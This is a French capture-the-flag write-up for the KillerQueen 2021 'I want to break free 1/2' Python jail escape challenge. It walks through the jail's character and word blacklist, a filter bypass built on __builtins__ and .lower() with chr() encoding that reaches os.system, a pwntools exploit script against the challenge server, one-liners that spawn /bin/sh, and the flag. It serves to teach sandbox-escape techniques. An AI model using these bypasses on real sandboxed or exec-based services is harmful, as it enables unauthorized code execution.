---
title: "I want to break free 1/2 | KillerQueen 2021 | Catégorie Pwn"
date: 2021-11-01T12:00:00Z
description: "Python Jail 1/2 | KillerQueen 2021"
categories: ["writeup"]
tags: ["pwn","tuto","writeup"]
keywords: ["tuto", "reverse","howto","ctf","KillerQueen","ctftime","I want to break free","python jail","jail","escape","bypass"]
---

# I want to break free 1/2 | KillerQueen 2021

## Fichier(s)
- [Jail](./files/jail.py)
- [blacklist.txt](./files/blacklist.txt)

## Necessaires
- Netcat
- Python3

## Flag
```
kqctf{0h_h0w_1_w4n7_70_br34k_fr33_2398d89vj3nsoicifh3bdoq1b39049v}
```
## Solution détaillée

Le but du challenge est d'escape la jail python pour afficher le contenu d'un Fichier txt et d'avoir le flag.

#### Analyse de Jail.py

```Python
#!/usr/bin/env python3
def server():
    message = """
    You are in jail. Can you escape?
"""
    print(message)
    while True:
        try:
            data = input("> ")
            safe = True
            for char in data:
                if not (ord(char)>=33 and ord(char)<=126):
                    safe = False
            with open("blacklist.txt","r") as f:
                badwords = f.readlines()
            for badword in badwords:
                if badword in data or data in badword:
                    safe = False
            if safe:
                print(exec(data))
            else:
                print("You used a bad word!")
        except Exception as e:
            print("Something went wrong.")
            print(e)
            exit()

if __name__ == "__main__":
    server()
```
On a une boucle infinie qui récupère notre input et l'exécute dans un ``eval(input)`` sous certaines conditions .
En effet il exécute la commande python si `safe` prend la valeur **True**
Celle ci est définie sur *True* de base et passe sur *False* si elle détecte un mauvais charactère.

On a 2 filtres :
- Le premier sur les charactères
- Le second sur les mots utilisés

Notre commande ne dois pas contenir de lettre aillant pour un ordre dans la table ascii inférieur a 33 et supérieur a 126 :
Ainsi les espaces , les backslashs , et autres charactères spéciaux sont interdit ?
Enfin , on ne peut pas utiliser ces mots :
```
cat grep nano import eval subprocess input sys execfile open exec for dir file input write while echo print int os read
```

#### Proof Of Concept (POC)
Avant d'exécuter nos commandes, nous devons faire notre POC , c'est à dire réussir à exécuter une commande simple sur la machine distante .
Pour ce faire, affichons les modules disponibles depuis la jail :

```python
print(__builtins__.__dict__)
```
Le souci est que ``print`` est blacklisté !
Ne sachant pas les modules utilisés, j'ai exécuté sur ma machine la commande pour voir quel module il pourrait y avoir à exploiter :
La chose importante qui en est ressortie et :

```python
'__import__': <built-in function __import__>
```
Supposons que notre cible ait aussi *import*

Comme dans une [SSTI](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) (Server Side Template Injection) , le but est d'importer le module ``\'os\'``

On trouve facilement ce payload sur internet :

```python
__builtins__.__dict__['__import__'.lower()]('os').__dict__['system']('id')
```

Malheureusement, on ne peut pas utiliser :
- 'os'
- 'import'
- sys de 'system'

On peut bypass **import** en le remplaçant par **IMPORT** et a l'inverse , on remplace **'os'** par **'OS'.lower()** et **'system'** par **'SYSTEM'.lower()**

On a donc notre payload final :
```python
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')
```

![Alt text](./img/id.png)


Maintenant, nous sommes confrontés à un nouveau problème, on ne peut pas faire d’espace.
On peut contourner le filtre de 2 manières, soit en convertissant en octal la commande, soit en remplaçant chaque lettre par son correspondant ``chr()`` de la table ascii

Exemple :
![Alt text](./img/bypass.png)

#### Exploit

Grâce a cette technique on peut écrire un script pour avoir notre RCE :
J'utilise pwntools pour faciliter la gestion du socket TCP (netcat)

```python
#!/usr/bin/env python3
from pwn import *

blacklisted = ['cat','grep','nano','import','eval','subprocess','input','sys','execfile','open','exec','for','dir','file','input','write','while','echo','print','int','os','read']

ip = '143.198.184.186'
port = 45458

proc = remote(ip, port)
print(proc.recv().decode('latin-1'))

def valid(cmd):
	safe = True
	for char in str(cmd):
		if not (ord(char)>=33 and ord(char)<=126):
			safe = False
			print('Badchar !! '+char)
	for badword in blacklisted:
		if badword in str(cmd):
			safe = False
			print("You used a bad word!")
	return safe


def rce():
	# Get User Input
	data = input().strip("\n")

	# Payload
	final = b"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]("
	for i in range(len(data)-1):
		final += bytes('chr('+str(ord(data[i]))+')+', 'utf-8')
	final += bytes('chr('+str(ord(data[len(data)-1]))+')', 'utf-8')
	final += b")"
	if valid(final):
		# Send Payload
		proc.sendline(final)
		# Print Response
		print(proc.recv().decode('latin-1'))
	else:
		print("You used a bad word!")

while(True):
	rce()
```
Disponible [ici](./files/exploit.py)

Et voici le résultat :

![Alt text](./img/flag.png)


D'autres joueurs on fait d'autres méthodes intéressantes comme celle-ci pour avoir directement un shell:
```Python
getattr(getattr(__builtins__,"__imp"+"ort__")("o"+"s"),"sy"+"stem")("/bin/sh")
```
ou
```Python
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('sh')
```
